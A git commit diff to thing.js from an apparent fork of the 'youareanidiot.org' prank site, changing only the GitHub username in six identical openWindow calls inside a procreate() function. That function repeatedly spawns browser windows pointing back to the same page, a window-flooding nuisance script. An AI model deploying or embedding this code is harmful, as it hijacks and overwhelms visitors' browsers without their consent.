13b8ab611cc6beed1ba1c08087c920cb3f489c2b
Descendo The Monkei <61548447+hayden-droid@users.noreply.github.com>
2023-05-29 16:44:48 +0100

    Update thing.js

--- thing/thing.js
+++ thing/thing.js
@@ -11,12 +11,12 @@ function openWindow(url){
 }
 
 function procreate(){
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/hayden-droid/youareanidiot.org-original-source-code/master/thing/thing.html');
 		}
 
 function newXlt(){
